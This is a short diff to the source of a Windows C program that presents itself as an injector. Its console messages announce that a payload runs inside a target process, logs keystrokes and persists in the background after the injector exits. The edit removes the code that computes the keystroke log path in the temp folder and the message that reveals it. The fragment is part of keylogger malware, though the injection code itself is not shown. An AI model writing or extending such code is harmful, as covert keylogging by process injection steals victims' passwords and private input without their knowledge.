@@ -94,20 +94,10 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    // Success - display log path location
-    char tempPath[MAX_PATH];
-    char logPath[MAX_PATH];
-    if (GetTempPathA(MAX_PATH, tempPath) > 0) {
-        sprintf_s(logPath, MAX_PATH, "%s%s", tempPath, LOG_FILE_NAME);
-    } else {
-        sprintf_s(logPath, MAX_PATH, "%%TEMP%%\\%s", LOG_FILE_NAME);
-    }
-
     printf("======================================\n");
     printf("[+] All tasks completed successfully!\n");
     printf("======================================\n\n");
     printf("[*] The payload is now running inside %s\n", TARGET_PROCESS);
-    printf("[*] Keystrokes will be logged to: %s\n", logPath);
     printf("[*] This injector will now exit.\n");
     printf("[*] The payload will continue running in the background.\n\n");
     printf("[*] To uninstall: Run with --uninstall flag\n");
